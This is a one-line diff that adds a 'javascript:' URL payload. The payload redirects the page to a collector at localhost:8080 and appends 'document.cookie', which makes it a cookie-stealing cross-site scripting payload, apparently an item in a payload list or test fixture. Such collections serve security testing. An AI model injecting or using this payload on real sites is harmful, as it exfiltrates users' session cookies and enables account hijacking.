@@ -1,0 +1,1 @@
+javascript:document.location="http://localhost:8080/lld/go?cookies="+document.cookie
